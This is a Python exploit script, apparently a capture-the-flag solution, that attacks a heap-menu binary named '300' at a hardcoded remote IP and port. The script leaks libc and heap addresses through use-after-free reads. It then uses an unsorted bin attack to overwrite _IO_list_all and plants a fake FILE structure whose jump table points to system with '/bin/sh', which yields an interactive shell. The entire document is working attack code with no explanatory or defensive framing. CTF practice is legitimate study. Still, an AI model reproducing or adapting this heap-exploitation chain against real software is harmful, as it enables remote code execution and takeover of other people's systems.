#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './300'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'104.199.25.43', 'port':1337})
                        #remote  = {'host':'localhost', 'port':1337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    pwn = Pwn(conn)

    pwn.Alloc(0)
    pwn.Alloc(1)
    pwn.Alloc(2)
    pwn.Alloc(3)

    pwn.Free(2)
    addr_libc_mainarena = u(pwn.Print(2)) - 0x58
    libc.address    = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base   = 0x{:08x}'.format(libc.address))
    addr_libc_io_list_all   = libc.symbols['_IO_list_all']
    addr_libc_str_jumps     = libc.symbols['_IO_file_jumps'] + 0xc0
    addr_libc_system        = libc.sep_function['system']

    pwn.Free(0)
    addr_heap_base = u(pwn.Print(0)) - 0x620
    info('addr_heap_base   = 0x{:08x}'.format(addr_heap_base))

    fake_fd_bk  = p64(0xdeadbeef)
    fake_fd_bk += p64(addr_libc_io_list_all - 0x10)
    pwn.Write(0, fake_fd_bk)

    fake_chunk  = p64(0)
    fake_chunk += p64(0x61)
    fake_chunk += p64(addr_heap_base + 0x620)
    fake_chunk += p64(addr_heap_base)
    fake_chunk += p64(0)                                # _IO_write_base
    fake_chunk += p(-1)                                 # _IO_write_ptr
    fake_chunk += p64(0)
    fake_chunk += p64(0)                                # _IO_buf_base
    fake_chunk += p64((addr_heap_base + 0x630-100)/2)   # _IO_buf_end
    fake_chunk += '\x00'*(0xd8-len(fake_chunk))
    fake_chunk += p64(addr_libc_str_jumps)
    fake_chunk += p64(addr_libc_system)
    pwn.Write(1, fake_chunk)

    fake_fd_bk  = p64(addr_libc_mainarena + 0x58)
    fake_fd_bk += p64(addr_heap_base + 0x320)
    pwn.Write(2, fake_fd_bk)

    pwn.Write(2, '/bin/sh')

    # link 'addr_heap_base + 0x320' to small bin
    pwn.Alloc(4)
    # unsorted bin attack (_IO_list_all -> top)
    pwn.Alloc(5)

    # crash
    pwn.Alloc(0)

class Pwn:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def Alloc(self, slot):
        self.sendlineafter("free\n", "1")
        self.sendlineafter("(0-9)\n", str(slot))

    def Write(self, slot, s):
        self.sendlineafter("free\n", "2")
        self.sendlineafter("(0-9)\n", str(slot))
        self.send(s)

    def Print(self, slot):
        self.sendlineafter("free\n", "3")
        self.sendlineafter("(0-9)\n", str(slot))
        return self.recvuntil("\n1) alloc", drop=True)

    def Free(self, slot):
        self.sendlineafter("free\n", "4")
        self.sendlineafter("(0-9)\n", str(slot))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
